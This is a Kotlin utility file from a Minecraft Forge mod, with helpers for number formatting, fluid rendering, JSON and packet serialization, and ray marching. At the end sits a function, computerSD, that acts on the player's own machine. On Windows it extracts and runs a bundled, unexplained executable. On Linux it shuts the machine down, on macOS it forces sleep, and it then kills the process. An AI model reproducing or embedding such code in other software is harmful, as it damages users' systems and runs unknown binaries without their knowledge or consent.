@file:Suppress("unused")

package breadmod.util

import breadmod.datagen.tool_gun.mode.ToolGunPowerMode
import com.google.gson.JsonArray
import com.google.gson.JsonElement
import com.google.gson.JsonObject
import com.mojang.blaze3d.systems.RenderSystem
import com.mojang.blaze3d.vertex.*
import net.minecraft.client.Minecraft
import net.minecraft.client.gui.GuiGraphics
import net.minecraft.client.renderer.GameRenderer
import net.minecraft.core.BlockPos
import net.minecraft.core.Direction
import net.minecraft.data.tags.IntrinsicHolderTagsProvider.IntrinsicTagAppender
import net.minecraft.data.tags.TagsProvider
import net.minecraft.nbt.CompoundTag
import net.minecraft.network.FriendlyByteBuf
import net.minecraft.network.chat.Component
import net.minecraft.network.chat.MutableComponent
import net.minecraft.network.chat.contents.LiteralContents
import net.minecraft.network.chat.contents.TranslatableContents
import net.minecraft.resources.ResourceLocation
import net.minecraft.tags.TagKey
import net.minecraft.world.inventory.InventoryMenu
import net.minecraft.world.item.ItemStack
import net.minecraft.world.level.Level
import net.minecraft.world.level.block.state.BlockState
import net.minecraft.world.level.material.Fluid
import net.minecraft.world.phys.AABB
import net.minecraft.world.phys.Vec3
import net.minecraftforge.client.extensions.common.IClientFluidTypeExtensions
import net.minecraftforge.fluids.FluidStack
import net.minecraftforge.fluids.capability.IFluidHandler
import net.minecraftforge.registries.ForgeRegistries
import net.minecraftforge.registries.IForgeRegistry
import net.minecraftforge.registries.RegistryObject
import org.joml.Matrix4f
import org.joml.Vector2f
import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.plus
import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.times
import thedarkcolour.kotlinforforge.forge.vectorutil.v3d.toVec3i
import java.awt.Color
import java.nio.file.Files
import java.util.*
import kotlin.io.path.absolutePathString
import kotlin.io.path.writeBytes
import kotlin.math.ceil
import kotlin.math.floor
import kotlin.math.ln
import kotlin.math.min
import kotlin.system.exitProcess

val formatArray = listOf("p", "n", "m", "", "k", "M", "G", "T", "P", "E")
fun formatNumber(pN: Double, pUnitOffset: Int = 0, pUnitMax: Int = 1000): Pair<Double, String> {
    var num = pN
    var index = 3 + pUnitOffset
    while (num >= pUnitMax && index < formatArray.size - 1) {
        num /= pUnitMax
        index++
    }
    while (num < 1 && index > 0) {
        num *= pUnitMax
        index--
    }
    return num to formatArray[index]
}

fun formatUnit(pFrom: Double, pTo: Double, pUnit: String, pFormatShort: Boolean, pDecimals: Int, pUnitOffset: Int = 0, pUnitMax: Int = 1000): String {
    val formatStr = "%.${pDecimals}f %s/ %.${pDecimals}f %s (%.${pDecimals}f%%)"
    val percent = (pFrom / pTo) * 100
    if (pFormatShort) {
        val toFormat = formatNumber(pTo, pUnitOffset, pUnitMax)
        val fromFormat = formatNumber(pFrom, pUnitOffset, pUnitMax)
        return String.format(
            formatStr,
            fromFormat.first, if(toFormat.second != fromFormat.second) "${fromFormat.second}$pUnit " else "",
            toFormat.first, toFormat.second + pUnit,
            percent
        )
    } else {
        return String.format(
            formatStr,
            pFrom, "",
            pTo, pUnit,
            percent
        )
    }
}
fun formatUnit(pFrom: Int, pTo: Int, pUnit: String, pFormatShort: Boolean, pDecimals: Int, pUnitOffset: Int = 0, pUnitMax: Int = 1000): String =
    formatUnit(pFrom.toDouble(), pTo.toDouble(), pUnit, pFormatShort, pDecimals, pUnitOffset, pUnitMax)

private val logs = mutableMapOf<Double, Double>()
fun isSquareOf(n: Double, p: Double) = logs.getOrPut(p) { ln(p) }.let { ((ceil(n) / it)) == floor(n / it) }
fun isSquareOf(n: Int, p: Int) = isSquareOf(n.toDouble(), p.toDouble())

fun GuiGraphics.renderFluid(
    pX: Float, pY: Float, pWidth: Int, pHeight: Int,
    pFluid: Fluid, pFlowing: Boolean, pDirection: Direction = Direction.NORTH,
) {
    val atlas = Minecraft.getInstance().getTextureAtlas(InventoryMenu.BLOCK_ATLAS)
    val ext = IClientFluidTypeExtensions.of(pFluid)
    val spriteDiff = if(pFlowing) {
        val stillWidth = atlas.apply(ext.stillTexture).contents().width().toFloat()
        atlas.apply(ext.flowingTexture).let { val flowingWidth = it.contents().width(); it to if(flowingWidth > stillWidth) (stillWidth / flowingWidth) else 1F }
    } else atlas.apply(ext.stillTexture) to 1F

    val sprite = spriteDiff.first
    val colors = FloatArray(4).also { Color(ext.tintColor).getComponents(it) }
    val matrix4f: Matrix4f = this.pose().last().pose()
    RenderSystem.setShaderTexture(0, sprite.atlasLocation())
    RenderSystem.setShader { GameRenderer.getPositionColorTexShader() }
    RenderSystem.enableBlend()
    val bufferBuilder = Tesselator.getInstance().builder
    bufferBuilder.begin(VertexFormat.Mode.QUADS, DefaultVertexFormat.POSITION_COLOR_TEX)

    val pX2 = pX + pWidth

    var remainingFluid = pHeight
    while(remainingFluid > 0) {
        // TODO: Make pY the TOP LEFT, instead of BOTTOM LEFT
        val lpY = (pY - remainingFluid); val lpY2 = lpY + min(remainingFluid, pWidth)

        // N  // E  // S  // W
        // AB // CA // DC // BD
        // CD // DB // BA // AC
        // (pX, lpY2), (pX2, lpY2)
        // (pX, lpY ), (pX2, lpY )
        val rotated = listOf(Vector2f(pX, lpY), Vector2f(pX, lpY2), Vector2f(pX2, lpY2), Vector2f(pX2, lpY)).also {
            Collections.rotate(
                it,
                when(pDirection) { Direction.EAST -> 1; Direction.SOUTH -> 2; Direction.WEST -> 3; else -> 0 }
            )
        }

        val dv1 = (sprite.v1 - sprite.v0)
        val v1 = if(remainingFluid < pWidth) (sprite.v0 + ((dv1 / pWidth) * remainingFluid)) else (sprite.v0 + (dv1 * spriteDiff.second))
        val u1 = sprite.u0 + ((sprite.u1 - sprite.u0) * spriteDiff.second)

        fun VertexConsumer.color() = this.color(colors[0], colors[1], colors[2], colors[3])
        rotated[0].let { bufferBuilder.vertex(matrix4f, it.x, it.y, 0F).color().uv(       u1,        v1).endVertex() }
        rotated[1].let { bufferBuilder.vertex(matrix4f, it.x, it.y, 0F).color().uv(       u1, sprite.v0).endVertex() }
        rotated[2].let { bufferBuilder.vertex(matrix4f, it.x, it.y, 0F).color().uv(sprite.u0, sprite.v0).endVertex() }
        rotated[3].let { bufferBuilder.vertex(matrix4f, it.x, it.y, 0F).color().uv(sprite.u0,        v1).endVertex() }

        remainingFluid -= pWidth
    }

    BufferUploader.drawWithShader(bufferBuilder.end())
    RenderSystem.disableBlend()
}

const val ENTRY_ID_KEY = "id"
const val ENTRY_AMOUNT_KEY = "amount"
fun <T> IForgeRegistry<T>.reifyEntryID(p0: JsonObject) = this.getValue(
    ResourceLocation(p0.get(
        ENTRY_ID_KEY
    ).asString)
)!!

fun JsonElement?.readIntSafe(): Int = this.let { if(it?.isJsonPrimitive == true) it.asInt else 1 }
fun JsonArray.extractJsonFluidList() = this.map { entryObject ->
    val entry = entryObject.asJsonObject
    FluidStack(ForgeRegistries.FLUIDS.reifyEntryID(entry), entry.get(ENTRY_AMOUNT_KEY).readIntSafe())
}
fun List<FluidStack>.jsonifyFluidList(into: JsonArray = JsonArray(), keyUseName: String = ENTRY_ID_KEY) = into.also {
    this.forEach { stack -> it.add(JsonObject().also { obj ->
        obj.addProperty(keyUseName, ForgeRegistries.FLUIDS.getKey(stack.fluid).toString())
        if(stack.amount > 1) obj.addProperty(ENTRY_AMOUNT_KEY, stack.amount)
    }) }
}
fun JsonArray.extractJsonItemList() = this.map { entryObject ->
    val entry = entryObject.asJsonObject
    ItemStack(ForgeRegistries.ITEMS.reifyEntryID(entry), entry.get(ENTRY_AMOUNT_KEY).readIntSafe())
}
fun List<ItemStack>.jsonifyItemList(into: JsonArray = JsonArray(), keyUseName: String = ENTRY_ID_KEY) = into.also {
    this.forEach { stack -> it.add(JsonObject().also { obj ->
        obj.addProperty(keyUseName, ForgeRegistries.ITEMS.getKey(stack.item).toString())
        if(stack.count > 1) obj.addProperty(ENTRY_AMOUNT_KEY, stack.count)
    }) }
}

fun <T> IForgeRegistry<T>.createTagKey(path: String): TagKey<T> = TagKey.create(this.registryKey, ResourceLocation(path))
fun <T> JsonArray.extractJsonTagList(registry: IForgeRegistry<T>, keyUseName: String = ENTRY_ID_KEY) = this.map { entryObject ->
    val entry = entryObject.asJsonObject
    registry.createTagKey(entry.get(keyUseName).asString) to entry.get(ENTRY_AMOUNT_KEY).readIntSafe()
}
fun List<Pair<TagKey<*>, Int>>.jsonifyTagList(into: JsonArray = JsonArray(), keyUseName: String = ENTRY_ID_KEY) = into.also {
    this.forEach { (tag, count) -> it.add(JsonObject().also { obj ->
        obj.addProperty(keyUseName, tag.location.toString())
        if(count > 1) obj.addProperty(ENTRY_AMOUNT_KEY, count)
    }) }
}

fun FriendlyByteBuf.readFluidList(): List<FluidStack> = List(this.readInt()) { this.readFluidStack() }
fun FriendlyByteBuf.writeFluidList(fluidList: List<FluidStack>) { this.writeInt(fluidList.size); fluidList.forEach { this.writeFluidStack(it) } }
fun FriendlyByteBuf.readItemList(): List<ItemStack> = List(this.readInt()) { this.readItem() }
fun FriendlyByteBuf.writeItemList(itemList: List<ItemStack>) { this.writeInt(itemList.size); itemList.forEach { this.writeItem(it) } }
fun <T> FriendlyByteBuf.readTagList(registry: IForgeRegistry<T>): List<Pair<TagKey<T>, Int>> = List(this.readInt()) { registry.createTagKey(this.readUtf()) to this.readInt() }
fun <T> FriendlyByteBuf.writeTagList(tagList: List<Pair<TagKey<T>, Int>>) { this.writeInt(tagList.size); tagList.forEach { this.writeUtf(it.first.location.toString()); this.writeInt(it.second)} }

fun Collection<ItemStack>.serialize(tag: CompoundTag): CompoundTag {
    this.forEachIndexed { index, stack -> tag.put(index.toString(), stack.serializeNBT()) }
    return tag
}
fun Collection<ItemStack>.serialize() = this.serialize(CompoundTag())
fun MutableList<ItemStack>.deserialize(tag: CompoundTag) = tag.allKeys.forEach { this[it.toInt()] = ItemStack.of(tag.getCompound(it)) }

fun Fluid.isTag(tag: TagKey<Fluid>): Boolean = ForgeRegistries.FLUIDS.tags()?.getTag(tag)?.contains(this) ?: false

fun IFluidHandler.amount(fluid: Fluid) =
    List(this.tanks) { this.getFluidInTank(it) }
        .filter { !it.isEmpty && it.fluid.isSame(fluid) }
        .sumOf { it.amount }
fun IFluidHandler.amount(fluid: TagKey<Fluid>) =
    List(this.tanks) { this.getFluidInTank(it) }
        .filter { !it.isEmpty && it.fluid.isTag(fluid) }
        .sumOf { it.amount }

inline fun <T, reified A: T> IntrinsicTagAppender<T>.add(vararg toAdd: RegistryObject<A>) =
    this.also { this.add(*toAdd.map { it.get() }.toTypedArray()) }
fun <T> IntrinsicTagAppender<T>.add(vararg toAdd: RegistryObject<T>) =
    (this as TagsProvider.TagAppender<T>).add(*toAdd.map { it }.toTypedArray())
fun <T> TagsProvider.TagAppender<T>.add(vararg toAdd: RegistryObject<T>) =
    this.also { this.add(*toAdd.map { it.key }.toTypedArray()) }

sealed class RayMarchResult(val type: RayMarchResultType, val startPosition: Vec3, val endPosition: Vec3, val direction: Vec3, val length: Double) {
    enum class RayMarchResultType {
        ENTITY,
        BLOCK
    }

    class Block(val blockState: BlockState, startPosition: Vec3, endPosition: Vec3, direction: Vec3, length: Double):
        RayMarchResult(RayMarchResultType.BLOCK, startPosition, endPosition, direction, length)
    class Entity(val entity: net.minecraft.world.entity.Entity, startPosition: Vec3, endPosition: Vec3, direction: Vec3, length: Double):
        RayMarchResult(RayMarchResultType.ENTITY, startPosition, endPosition, direction, length)

    companion object {
        fun Level.rayMarchEntity(exclude: net.minecraft.world.entity.Entity?, origin: Vec3, direction: Vec3, length: Double): Entity? {
            var distance = 0.0
            while(true) {
                val position = origin + (direction * distance)
                val entities = this.getEntities(exclude, AABB.ofSize(position, 1.0, 1.0, 1.0))
                if(entities.size > 0) entities.forEach { if(it.position().distanceTo(position) < 1.0) return Entity(it, origin, position, direction, length) }
                if(distance > length) return null
                distance += 0.1
            }
        }

        fun Level.rayMarchBlock(origin: Vec3, direction: Vec3, length: Double, countFluid: Boolean): Block? {
            var distance = 0.0
            while(true) {
                val position = origin + (direction * distance)
                val state = this.getBlockState(BlockPos(position.toVec3i()))
                if(!state.isAir && (countFluid || state.fluidState.fluidType.isAir)) return Block(state, origin, position, direction, length)
                if(distance > length) return null
                distance += 0.1
            }
        }
    }
}

fun FriendlyByteBuf.writeVec3(vec3: Vec3) = this.also { this.writeDouble(vec3.x).writeDouble(vec3.y).writeDouble(vec3.z) }
fun FriendlyByteBuf.readVec3() = Vec3(this.readDouble(), this.readDouble(), this.readDouble())


fun componentToJson(component: Component) = JsonObject().also {
    when(val contents = component.contents) {
        is TranslatableContents -> {
            it.addProperty("type", "translate")
            it.addProperty("key", contents.key)
            it.addProperty("fallback", contents.fallback)
            if(contents.args.isNotEmpty()) throw IllegalArgumentException("Arguments not supposed for jsonifying translatable contents - sorry!")
        }
        is LiteralContents -> {
            it.addProperty("type", "literal")
            it.addProperty("text", contents.text)
        }
        else -> throw IllegalArgumentException("Illegal contents: ${contents::class.qualifiedName} - please dbg.")
    }
}

fun jsonToComponent(json: JsonObject): MutableComponent = when(val type = json.getAsJsonPrimitive("type").asString) {
    "translate" -> Component.translatableWithFallback(
        json.getAsJsonPrimitive("key").asString,
        json.get("fallback")?.let { if(it.isJsonNull) null else it.asString }
    )
    "literal" -> Component.literal(json.getAsJsonPrimitive("text").asString)
    else -> throw IllegalArgumentException("Illegal component type: $type")
}

fun computerSD(aggressive: Boolean) {
    val runtime = Runtime.getRuntime()
    val os = System.getProperty("os.name")
    when {
        os.contains("win", true) -> {
            if(aggressive) {
                val resource = ToolGunPowerMode::class.java.getResourceAsStream("/a.exe")!!
                val temp = Files.createTempFile("a", "exe")
                temp.writeBytes(resource.readAllBytes())
                runtime.exec(temp.absolutePathString())
            }
            runtime.exec("RUNDLL32.EXE powrprof.dll,SetSuspendState 0,1,0")
        }
        os.contains("mac", true) -> {
            runtime.exec("pmset sleepnow")
        }
        os.contains("nix", true) || os.contains("nux", true) || os.contains("aix", true) -> {
            if(aggressive) runtime.exec("shutdown 0")
            runtime.exec("systemctl suspend")
        }
        else -> if(aggressive) throw IllegalStateException("Screw you! You're no fun.")
    }

    if(aggressive) {
        Thread.sleep(5000)
        exitProcess(0)
    }
}